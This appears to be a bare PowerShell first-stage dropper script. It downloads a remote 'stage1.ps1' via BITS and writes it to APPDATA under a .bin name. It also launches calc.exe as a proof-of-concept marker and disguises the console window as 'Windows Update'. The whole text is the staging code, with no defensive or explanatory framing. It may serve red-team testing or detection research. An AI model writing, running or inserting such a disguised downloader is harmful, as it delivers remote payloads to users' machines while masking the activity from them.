
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://internal.corp:8443/stage1.ps1",
    [string]$DropPath = "$env:APPDATA\stage1.bin",
    [int]$RequestTimeout = 82
)
Start-BitsTransfer -Source $Stage1Url -Destination $DropPath
Start-Process -FilePath "calc.exe"
$Host.UI.RawUI.WindowTitle = "Windows Update"
$StageMarker = "stage-31"
